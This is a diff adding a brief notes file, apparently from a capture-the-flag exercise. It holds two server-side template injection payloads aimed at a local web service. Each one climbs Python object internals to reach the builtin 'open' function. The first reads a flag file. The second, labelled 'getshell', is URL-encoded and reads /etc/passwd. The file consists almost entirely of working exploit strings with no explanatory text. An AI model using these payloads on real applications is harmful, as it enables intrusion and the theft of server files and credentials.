@@ -1,0 +1,7 @@
+http://127.0.0.1:8081/{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('./flag').read()}}
+
+
+getshell:
+
+
+http://127.0.0.1:8081/%7B%7B().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()%7D%7D
